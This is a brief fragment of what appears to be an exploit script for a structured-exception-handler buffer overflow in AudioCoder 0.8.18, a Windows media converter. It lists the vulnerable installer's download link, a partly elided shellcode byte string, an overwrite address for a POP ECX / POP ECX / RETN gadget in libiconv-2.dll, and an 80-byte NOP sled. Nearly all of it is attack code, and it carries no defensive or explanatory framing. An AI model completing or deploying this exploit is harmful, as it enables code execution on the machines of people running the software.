...
# Download link 
:http://www.mediacoderhq.com/getfile.htm?site=dl.mediacoderhq.com&file=AudioCoder-0.8.18.exe
...
begin
 shellcode =
"\x89\xe0\xdb\xc8\xd9\x70\xf4\x5b\x53\x59\x49\x49\x49\x49" +
...
"\x48\x55\x35\x43\x30\x41\x41"
 ...
 seh  = "\xEE\x04\x01\x66" # POP ECX / POP ECX / RETN from 
libiconv-2.dll
 nops = "\x90" * 80
